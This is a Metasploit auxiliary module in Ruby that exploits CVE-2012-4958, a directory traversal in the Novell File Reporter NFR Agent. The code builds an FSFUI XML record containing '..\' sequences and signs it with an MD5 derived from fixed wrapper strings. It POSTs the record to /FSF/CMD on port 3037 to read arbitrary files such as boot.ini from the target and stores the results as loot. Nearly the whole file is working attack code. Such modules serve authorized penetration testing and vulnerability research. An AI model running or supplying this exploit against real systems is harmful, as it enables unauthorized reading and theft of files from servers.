##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'         => 'NFR Agent FSFUI Record Arbitrary Remote File Access',
            'Description'  =>  %q{
              NFRAgent.exe, a component of Novell File Reporter (NFR), allows remote attackers to retrieve
              arbitrary text files via a directory traversal while handling requests to /FSF/CMD
              with an FSFUI record with UICMD 126. This module has been tested successfully
              against NFR Agent 1.0.4.3 (File Reporter 1.0.2) and NFR Agent 1.0.3.22 (File
              Reporter 1.0.1).
            },
            'References'   =>
                [
                    [ 'CVE', '2012-4958' ],
                    [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2012/11/16/nfr-agent-buffer-vulnerabilites-cve-2012-4959' ]
                ],
            'Author'       =>
                [
                    'juan vazquez'
                ],
            'License'      => MSF_LICENSE,
            'DisclosureDate' => "Nov 16 2012"
        )
    )

    register_options(
    [
      Opt::RPORT(3037),
      OptBool.new('SSL', [true, 'Use SSL', true]),
      OptString.new('RFILE', [true, 'Remote File', 'boot.ini']),
      OptInt.new('DEPTH', [true, 'Traversal depth', 6])
    ], self.class)

  end

  def rport
    datastore['RPORT']
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def run_host(ip)

    traversal = "..\\" * datastore['DEPTH']
    record = "<RECORD><NAME>FSFUI</NAME><UICMD>126</UICMD><FILE>#{traversal}#{datastore['RFILE']}</FILE></RECORD>"
    md5 = Rex::Text.md5("SRS" + record + "SERVER").upcase
    message = md5 + record

    print_status("#{peer} - Retrieving the file contents")

    res = send_request_cgi(
      {
        'uri'     => '/FSF/CMD',
        'version' => '1.1',
        'method'  => 'POST',
        'ctype'   => "text/xml",
        'data'    => message
      })

    if res and res.code == 200 and res.body =~ /<RESULT><VERSION>1<\/VERSION><STATUS>0<\/STATUS><CFILE><\!\[CDATA\[(.*)\]\]><\/CFILE><\/RESULT>/m
      loot = $1
      f = ::File.basename(datastore['RFILE'])
      path = store_loot('novell.filereporter.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])
      print_status("#{peer} - #{datastore['RFILE']} saved in #{path}")
    else
      print_error("#{peer} - Failed to retrieve the file contents")
    end
  end

end

